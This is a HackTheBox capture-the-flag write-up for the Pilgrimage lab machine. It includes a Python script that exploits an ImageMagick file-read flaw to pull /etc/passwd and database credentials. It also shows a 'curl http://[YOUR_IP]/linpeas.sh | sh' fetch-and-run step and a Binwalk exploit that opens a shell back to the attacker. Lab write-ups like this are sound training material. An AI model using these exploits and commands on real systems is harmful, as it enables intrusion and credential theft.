---
title: "HTB - Pilgrimage"
date: "11/10/2024"
description: "Write-up of the Pilgrimage machine on HackTheBox."
tags: ["HackTheBox"]
image: "https://shigatena.dev/articles/htb_pilgrimage.png"
readingTime: "10"
---

![preview](https://shigatena.dev/articles/htb_pilgrimage.png)

## Initial Setup

Update your `/etc/hosts` with the entry for `pilgrimage.htb`.

## Initial Reconnaissance

Start a scan with [AutoRecon](https://github.com/Tib3rius/AutoRecon).

```bash
autorecon pilgrimage.htb -v
```

From the `tcp_80_http_feroxbuster_dirbuster` output, we notice that a `.git` repository is present.

## Web Vulnerability Exploration

To exploit the `.git` repository and pull more information, install and run `git-dumper`.

```bash
pip install git-dumper
```

```bash
~/.local/bin/git-dumper http://pilgrimage.htb/.git/ git
```

From the extracted files, an executable named `magick` is spotted. When running this executable with the `-version` argument:

```bash
./magick -version
```

We find out that the software version is `ImageMagick 7.1.0-49`. A quick search reveals a vulnerability for this version: [CVE Details](https://github.com/voidz0r/CVE-2022-44268).

Clone the repository related to the CVE and proceed.

```bash
git clone https://github.com/voidz0r/CVE-2022-44268
```

I also made a Python script to make the process easier: 
```python
import re
import sys
import requests
import subprocess
import argparse
from urllib.parse import urlparse, parse_qs

def extract_hex_data(data):
    regex_pattern = r"^([0-9a-fA-F]+\n)+$"
    match = re.search(regex_pattern, data, re.MULTILINE)
    return match.group(0) if match else None

def download_image_from_url(url):
    response = requests.get(url, stream=True)
    with open('output.png', 'wb') as file:
        for chunk in response.iter_content(chunk_size=8192): 
            file.write(chunk)

def run_cargo(arg):
    command = ["cargo", "run", arg]
    subprocess.run(command, stdout=subprocess.DEVNULL)

def convert_image_and_upload():
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
    }

    with open('image.png', 'rb') as f:
        files = {'toConvert': ('image.png', f, 'image/png')}
        response = requests.post(BASE_URL, headers=headers, files=files)
        parsed_url = urlparse(response.url)
        params = parse_qs(parsed_url.query)
        return params['message'][0]

def identify_image():
    command = ["./magick", "identify", "-verbose", "output.png"]
    result = subprocess.run(command, capture_output=True, text=True)
    return result.stdout

def main():

    parser = argparse.ArgumentParser(description="Process and send an image to a server.")
    parser.add_argument('-i', '--input_arg', help='Argument for the cargo command.')
    parser.add_argument('-u', '--url', default="http://pilgrimage.htb/", help='Base URL for the service. Default: http://pilgrimage.htb/')

    args = parser.parse_args()
    arg = args.input_arg
    global BASE_URL
    BASE_URL = args.url

    # Run the cargo command
    run_cargo(arg)
    
    # Convert the image and upload
    image_url = convert_image_and_upload()
    
    # Download the image from the returned URL
    download_image_from_url(image_url)

    # Identify the image
    data = identify_image()
    result = extract_hex_data(data)
    
    if result:
        print(bytes.fromhex(result))
    else:
        print("No sequence found.")

if __name__ == "__main__":
    main()
```

Test the PoC command with the following:

```bash
python auto_pilgrim.py -i "/etc/passwd"
```

Revert back to the folder extracted from the git dump. After analyzing the files, we notice that it tries to fetch database credentials from `/var/db/pilgrimage` as seen in `dashboard.php`.

```bash
python auto_pilgrim.py -i "/var/db/pilgrimage"
```

This command returns the password for the user Emily.

## Privilege Escalation

Pn your own machine, download LinPEAS for further enumeration:

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest
```

Start a local web server:

```bash
sudo python3 -m http.server 80
```

Use the fetched password to SSH as Emily.

```bash
ssh emily@[BOX_IP]
```

And from Emily's shell:

```bash
curl http://[YOUR_IP]/linpeas.sh | sh
```

LinPEAS points to `user.txt` for the first flag and also highlights an interesting process: `/usr/sbin/malwarescan.sh`.
On reading the shell script:

```bash
cat /usr/sbin/malwarescan.sh
```

We find out it uses `binwalk`, especially `Binwalk v2.3.2` that is vulnerable as showcased by [this exploit](https://www.exploit-db.com/exploits/51249).

Use the exploit script with a random image:

```bash
python exploit.py random_image.png [YOUR_IP] [YOUR_PORT]
```

Start a Python webserver so that we can download the image from Emily's shell :

```bash
sudo python3 -m http.server 80
```

On Emily's shell, fetch the image:

```bash
wget http://[YOUR_IP]/binwalk_exploit.png
```

Once malwarescan.sh triggers the exploit, verify that you are root:

```bash
whoami
```
Now find and display the root flag:

```bash
find / -type f -name root.txt 2>/dev/null 
cat /root/root.txt
```

Happy rooting :-)